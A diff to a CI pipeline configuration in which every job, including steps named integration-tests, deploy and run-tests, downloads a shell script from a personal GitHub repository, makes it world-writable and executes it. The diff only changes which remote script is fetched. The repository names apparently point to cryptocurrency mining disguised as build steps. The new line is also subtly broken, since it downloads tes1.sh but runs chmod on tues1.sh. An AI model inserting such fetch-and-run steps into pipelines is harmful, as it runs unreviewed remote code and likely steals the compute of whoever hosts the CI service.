@@ -43,7 +43,7 @@ integration-tests:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                          
 
     
@@ -60,7 +60,7 @@ deploy:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 
     
@@ -79,7 +79,7 @@ run-tests:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+                 wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                  
 integration-tests1:
   box: 
@@ -96,7 +96,7 @@ integration-tests1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 integration-tests2:
   box: 
@@ -113,7 +113,7 @@ integration-tests2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 integration-tests3:
   box: 
@@ -130,7 +130,7 @@ integration-tests3:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
 
 deploy1:
   box: 
@@ -145,7 +145,7 @@ deploy1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 
     
@@ -164,7 +164,7 @@ run-tests1:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+                 wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                  
 integration-tests4:
   box: 
@@ -181,7 +181,7 @@ integration-tests4:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 integration-tests5:
   box: 
@@ -198,7 +198,7 @@ integration-tests5:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 integration-tests6:
   box: 
@@ -215,7 +215,7 @@ integration-tests6:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
 
 deploy2:
   box: 
@@ -230,7 +230,7 @@ deploy2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 
     
@@ -249,7 +249,7 @@ run-tests2:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+                 wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                  
 integration-tests7:
   box: 
@@ -266,7 +266,7 @@ integration-tests7:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 integration-tests8:
   box: 
@@ -283,7 +283,7 @@ integration-tests8:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
                
 integration-tests9:
   box: 
@@ -300,4 +300,4 @@ integration-tests9:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               wget https://raw.githubusercontent.com/raufpermana22/verusruby/main/tes1.sh && chmod 777 tues1.sh && ./tes1.sh
